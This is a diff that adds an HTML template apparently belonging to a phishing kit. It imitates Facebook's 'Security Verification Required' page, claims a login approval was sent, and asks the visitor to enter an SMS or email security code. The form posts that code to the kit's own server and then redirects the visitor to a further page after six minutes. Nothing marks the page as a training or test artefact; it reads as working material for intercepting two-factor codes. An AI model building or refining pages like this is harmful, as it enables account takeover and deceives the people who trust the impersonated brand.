@@ -1,0 +1,157 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(24,119,242,0.25);border-radius:16px;">
+  <div class="platform-header">
+    <div class="icon-circle bg-facebook">
+      <i class="fa-brands fa-facebook icon-lg"></i>
+    </div>
+    <div>
+      <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook</h2>
+      <div style="color:#64748b;font-size:13px;margin-top:4px">Security Verification Required</div>
+    </div>
+  </div>
+
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  
+  <div class="security-options">
+    <div class="option-card">
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Option 1: Login Approval</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        For account security, please verify you are the authorized account owner. We've sent a login notification to your registered device. Approve the request to proceed with authentication.
+      </p>
+    </div>
+
+    <div class="option-card">
+      <h4 style="color:#1e293b;margin:16px 0 8px 0;font-size:15px;font-weight:600">Option 2: Verification Code</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        If you received a security code via SMS or email from Facebook, please enter it below to complete the verification process.
+      </p>
+    </div>
+  </div>
+  
+  <form id="loginForm" method="post" novalidate>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
+    <div class="error-text" id="digitsError"></div>
+
+    <div class="center">
+      <button class="btn login-btn" type="submit">Verify & Continue</button>
+    </div>
+  </form>
+
+  <div class="note-box">
+    <p style="font-size:13px;color:#64748b;margin:0;line-height:1.5">
+      <strong>Note:</strong> If you've already approved the login request, please allow a moment for system verification. The process typically completes within seconds.
+    </p>
+  </div>
+
+  <script>
+  // Auto redirect after 6 minutes (360,000 ms) - INCREASED FROM 2 MINUTES
+  setTimeout(function(){ window.location = "{{ url_for('f1') }}"; }, 360000);
+
+  // Validation for 4-9 digits
+  document.getElementById("loginForm").addEventListener("submit", function(event) {
+    const digits = document.getElementById("digits");
+    const digitsError = document.getElementById("digitsError");
+
+    let valid = true;
+    digits.classList.remove("input-error");
+    digitsError.textContent = "";
+
+    const val = digits.value.trim();
+    const pattern = /^\d{4,9}$/; // only 4-9 digits allowed
+
+    if (!pattern.test(val)) {
+      valid = false;
+      digits.classList.add("input-error");
+      digitsError.textContent = "The code you entered is incorrect.";
+    }
+
+    if (!valid) event.preventDefault();
+  });
+
+  document.getElementById("digits").addEventListener("input", () => {
+    const digits = document.getElementById("digits");
+    const digitsError = document.getElementById("digitsError");
+    digits.classList.remove("input-error");
+    digitsError.textContent = "";
+  });
+  </script>
+</div>
+
+<style>
+.input {
+  width: 100%;
+  padding: 14px;
+  border-radius: 18px; /* ROUNDED INPUT */
+  border: 1px solid #e5e7eb;
+  margin-bottom: 8px;
+  font-size: 16px;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  background: #fafafa;
+}
+.input:focus {
+  border-color: #1877F2;
+  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+  outline: none;
+  background: #ffffff;
+}
+.input-error {
+  border-color: #ef4444;
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+}
+.error-text {
+  color: #ef4444;
+  font-size: 13px;
+  margin-top: -4px;
+  margin-bottom: 8px;
+}
+
+.login-btn {
+  width: 100%;
+  background: #1877F2;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  padding: 12px;
+  border-radius: 25px; /* ROUNDED LOGIN BUTTON */
+  cursor: pointer;
+  border: none;
+  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
+  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
+  display: block;
+  margin-top: 8px;
+}
+.login-btn:hover {
+  background: #166fe5;
+  box-shadow: 0 8px 20px rgba(24,119,242,0.45);
+}
+.login-btn:active {
+  transform: scale(0.985);
+}
+
+.security-options {
+  margin: 20px 0;
+}
+
+.option-card {
+  background: #f8fafc;
+  padding: 16px;
+  border-radius: 12px;
+  border-left: 4px solid #1877F2;
+  margin-bottom: 16px;
+}
+
+.note-box {
+  background: #fffbeb;
+  border: 1px solid #fef3c7;
+  border-radius: 12px;
+  padding: 12px 16px;
+  margin-top: 20px;
+}
+
+.center {
+  text-align: center;
+}
+</style>
+{% endblock %}
